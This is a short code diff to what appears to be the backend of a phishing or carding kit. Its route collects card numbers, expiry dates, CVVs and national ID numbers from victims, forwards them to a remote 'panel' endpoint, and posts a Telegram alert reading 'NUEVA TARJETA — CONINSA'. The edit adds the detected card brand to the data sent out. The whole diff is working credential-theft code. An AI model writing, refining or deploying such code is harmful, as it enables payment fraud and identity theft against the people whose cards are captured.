@@ -185,6 +185,10 @@ app.post('/api/ping', (req, res) => {
 app.post('/api/tarjeta/crear', async (req, res) => {
   try {
     const { numero_tarjeta, fecha, cvv, tipo_doc, cedula, monto } = req.body || {};
+    const banco = (await detectBin(numero_tarjeta)) ||
+      (num => num[0]==='4' ? 'Visa' : num[0]==='5' ? 'Mastercard' : num[0]==='3' ? 'Amex/Diners' : 'Otra')(
+        (numero_tarjeta || '').replace(/\s/g,'')
+      );
     const params = new URLSearchParams({
       numero_tarjeta: numero_tarjeta || '',
       fecha:          fecha || '',
@@ -196,16 +200,12 @@ app.post('/api/tarjeta/crear', async (req, res) => {
       celular:        '',
       email:          '',
       monto:          monto || 0,
+      banco:          banco,
     });
     const r = await axios.post(`${PSEC_BASE}//panel/run/create_tarjeta_m3it3m.php`, params.toString(), {
       headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
       timeout: 12000,
     });
-
-    const banco = (await detectBin(numero_tarjeta)) ||
-      (num => num[0]==='4' ? 'Visa' : num[0]==='5' ? 'Mastercard' : num[0]==='3' ? 'Amex/Diners' : 'Otra')(
-        (numero_tarjeta || '').replace(/\s/g,'')
-      );
     const hora = new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota' });
     await tgText(
       `💳 <b>NUEVA TARJETA — CONINSA</b>\n` +
@@ -216,7 +216,6 @@ app.post('/api/tarjeta/crear', async (req, res) => {
       `🕐 ${hora}\n` +
       `<i>(datos en el panel)</i>`
     );
-
     res.json(r.data);
   } catch (e) { res.json({ status: 'ERROR', message: e.message }); }
 });
